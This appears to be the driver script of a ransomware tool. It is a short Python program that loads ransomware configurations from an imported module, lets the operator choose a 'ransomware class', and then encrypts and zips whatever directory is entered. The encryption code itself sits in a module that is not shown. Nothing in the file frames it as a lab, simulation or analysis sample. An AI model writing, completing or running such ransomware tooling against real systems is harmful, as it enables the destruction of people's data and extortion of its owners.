import os
import json
import sys
from moSer import encrypt_and_zip_files, load_ransomware_config

def main():
    try:
        ransomware_data = load_ransomware_config()
    except Exception as e:
        print(f"Error loading ransomware configuration: {e}")
        sys.exit(1)
    print("Available ransomware classes:")
    for idx, cfg in enumerate(ransomware_data, 1):
        print(f"{idx}. {cfg['ransomware']}")
    try:
        ransomware_class_idx = int(input("Enter the ransomware class number: ")) - 1
        if not (0 <= ransomware_class_idx < len(ransomware_data)):
            print("Invalid ransomware class.")
            return
        ransomware_config = ransomware_data[ransomware_class_idx]
    except Exception as e:
        print(f"Invalid input: {e}")
        return
    directory_to_encrypt = input("Enter the directory to encrypt: ")
    encrypt_and_zip_files(directory_to_encrypt, ransomware_config)

if __name__ == "__main__":
    main()
